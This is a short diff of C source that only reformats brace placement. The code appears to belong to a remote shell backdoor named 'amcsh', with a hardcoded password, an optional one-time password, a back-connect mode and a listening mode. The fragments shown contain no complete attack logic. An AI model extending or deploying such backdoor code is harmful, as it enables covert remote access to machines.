@@ -28,7 +28,8 @@
 extern char **environ;
 static FILE *log_fp = NULL;
 
-void debuglog(char *msg, ...){
+void debuglog(char *msg, ...)
+{
 #ifdef _LOG_PATH
     va_list argp;
     if(log_fp == NULL)
@@ -42,7 +43,8 @@ void debuglog(char *msg, ...){
 #endif
 }
 
-void getpwd(char *pwd){
+void getpwd(char *pwd)
+{
     strcpy(pwd,PASSWORD);
 #ifdef _OneTimePass
     char *otp = malloc(7);
@@ -219,7 +221,8 @@ int worker(client)
     return 1;
 }
 #ifdef _BACK_CONNECT_INTERVAL
-int amcsh_connect(void){
+int amcsh_connect(void)
+{
     int server;
     struct sockaddr_in server_addr;
  
@@ -245,7 +248,8 @@ int amcsh_connect(void){
     return 0;
 }
 #else
-int amcsh_listen(void){
+int amcsh_listen(void)
+{
     int n;
     int client,server;
     struct sockaddr_in server_addr;
